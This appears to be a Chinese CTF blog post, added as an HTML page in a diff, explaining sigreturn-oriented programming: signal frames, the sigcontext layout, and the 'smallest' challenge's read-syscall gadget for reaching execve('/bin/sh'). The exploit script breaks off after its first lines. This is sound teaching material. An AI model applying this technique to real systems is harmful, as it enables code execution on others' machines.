@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="SROP signal机制 基本流程就是当有中断或者异常产生时，内核会向某个进程发送一个signal，该进程挂起进入内核，内核为其保存上下文，然后在signal handle中进行处理哦，退出后内核依据之前保存的上下文恢复进程原来的状态\n">
+<title>Srop</title>
+
+<link rel='canonical' href='https://Pwn3r4llD4ys.github.io/p/srop/'>
+
+<link rel="stylesheet" href="/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="Srop">
+<meta property='og:description' content="SROP signal机制 基本流程就是当有中断或者异常产生时，内核会向某个进程发送一个signal，该进程挂起进入内核，内核为其保存上下文，然后在signal handle中进行处理哦，退出后内核依据之前保存的上下文恢复进程原来的状态\n">
+<meta property='og:url' content='https://Pwn3r4llD4ys.github.io/p/srop/'>
+<meta property='og:site_name' content='Pwn3r4llD4ys'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='栈' /><meta property='article:tag' content='栈溢出' /><meta property='article:tag' content='ROP' /><meta property='article:published_time' content='2024-10-27T17:29:43&#43;08:00'/><meta property='article:modified_time' content='2024-10-27T17:29:43&#43;08:00'/>
+<meta name="twitter:title" content="Srop">
+<meta name="twitter:description" content="SROP signal机制 基本流程就是当有中断或者异常产生时，内核会向某个进程发送一个signal，该进程挂起进入内核，内核为其保存上下文，然后在signal handle中进行处理哦，退出后内核依据之前保存的上下文恢复进程原来的状态\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2032356966516602474.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Pwn3r4llD4ys</a></h1>
+            <h2 class="site-description">Code is cheap , show me your flag.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/393835650'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Pwn3r4llD4ys/'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://Pwn3r4llD4ys.github.io/en/" >English</option>
+                                
+                                    <option value="https://Pwn3r4llD4ys.github.io/" selected>中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#signal机制">signal机制</a></li>
+    <li><a href="#smallest">smallest</a>
+      <ol>
+        <li><a href="#检查">检查</a></li>
+        <li><a href="#反汇编">反汇编</a></li>
+        <li><a href="#控制程序流程">控制程序流程</a></li>
+        <li><a href="#整体流程">整体流程</a></li>
+        <li><a href="#exp">exp</a></li>
+      </ol>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" >
+                Pwn
+            </a>
+        
+            <a href="/categories/stack/" >
+                Stack
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/srop/">Srop</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2024-10-27</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="srop">SROP
+</h1><h2 id="signal机制">signal机制
+</h2><p>基本流程就是当有<strong>中断</strong>或者<strong>异常</strong>产生时，内核会向某个进程发送一个signal，该进程挂起进入内核，<strong>内核为其保存上下文</strong>，然后在signal handle中进行处理哦，退出后内核依据之前保存的上下文恢复进程原来的状态</p>
+<p><strong>这里有几个比较重要的地方</strong></p>
+<ul>
+<li>
+<p>进程的上下文保存的结构叫signal frame，保存在用户的地址空间中，用户具有读写的权限</p>
+<p><img src="/p/srop/srop2.png"
+	width="1898"
+	height="757"
+	srcset="/p/srop/srop2_hu12892038377383768945.png 480w, /p/srop/srop2_hu12020013669419526540.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="601px"
+	
+></p>
+</li>
+<li>
+<p>signal frame中主要保存<strong>寄存器的状态和值，栈上的局部变量和函数调用信息</strong>，结构体如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// x86
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">sigcontext</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">gs</span><span class="p">,</span> <span class="n">__gsh</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">fs</span><span class="p">,</span> <span class="n">__fsh</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">es</span><span class="p">,</span> <span class="n">__esh</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ds</span><span class="p">,</span> <span class="n">__dsh</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">edi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">esi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ebp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">esp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ebx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">edx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ecx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">eax</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">trapno</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">err</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">eip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">cs</span><span class="p">,</span> <span class="n">__csh</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">eflags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">esp_at_signal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ss</span><span class="p">,</span> <span class="n">__ssh</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_fpstate</span> <span class="o">*</span> <span class="n">fpstate</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">oldmask</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cr2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// x64
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">_fpstate</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* FPU environment matching the 64-bit FXSAVE layout.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint16_t</span>        <span class="n">cwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint16_t</span>        <span class="n">swd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint16_t</span>        <span class="n">ftw</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint16_t</span>        <span class="n">fop</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span>        <span class="n">rip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span>        <span class="n">rdp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint32_t</span>        <span class="n">mxcsr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint32_t</span>        <span class="n">mxcr_mask</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_fpxreg</span>    <span class="n">_st</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_xmmreg</span>    <span class="n">_xmm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint32_t</span>        <span class="n">padding</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">sigcontext</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">r8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">r9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">r10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">r11</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">r12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">r13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">r14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">r15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rdi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rsi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rbp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rbx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rdx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rax</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rcx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rsp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">rip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">eflags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">cs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">gs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">fs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">__pad0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">err</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">trapno</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">oldmask</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">cr2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__extension__</span> <span class="k">union</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">struct</span> <span class="n">_fpstate</span> <span class="o">*</span> <span class="n">fpstate</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__uint64_t</span> <span class="n">__fpstate_word</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__uint64_t</span> <span class="n">__reserved1</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<p><strong>假设可以控制一个signal frame那么就可以随意控制寄存器的值，从而执行任意命令</strong></p>
+<p>最终就是要调用<code>execve(&quot;/bin/sh&quot;, 0, 0)</code></p>
+<p><strong>在64位下要求rax=59,rdi=/bin/sh,rsi=0,rdx=0</strong></p>
+<h2 id="smallest">smallest
+</h2><h3 id="检查">检查
+</h3><p><img src="/p/srop/srop1.png"
+	width="921"
+	height="281"
+	srcset="/p/srop/srop1_hu9450859036060977764.png 480w, /p/srop/srop1_hu840426218975383436.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="327"
+		data-flex-basis="786px"
+	
+></p>
+<h3 id="反汇编">反汇编
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.text:00000000004000B0                 xor     rax, rax        ; rax = 0
+</span></span><span class="line"><span class="cl">.text:00000000004000B3                 mov     edx, 400h       ; count
+</span></span><span class="line"><span class="cl">.text:00000000004000B8                 mov     rsi, rsp        ; buf
+</span></span><span class="line"><span class="cl">.text:00000000004000BB                 mov     rdi, rax        ; fd
+</span></span><span class="line"><span class="cl">.text:00000000004000BE                 syscall                 ; LINUX - sys_read
+</span></span><span class="line"><span class="cl">.text:00000000004000C0                 retn
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>程序是64位的，rax置0进行syscall调用的是read，对应的三个参数通过寄存器传递</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>read往栈顶读取地址作为返回值，同时栈顶的地址取决于外界的输入，因此可以多输几次入口地址多次进行系统调用</strong></p>
+<p><img src="/p/srop/srop3.png"
+	width="1801"
+	height="680"
+	srcset="/p/srop/srop3_hu11954649988005932056.png 480w, /p/srop/srop3_hu16370656840979406790.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="635px"
+	
+></p>
+<h3 id="控制程序流程">控制程序流程
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
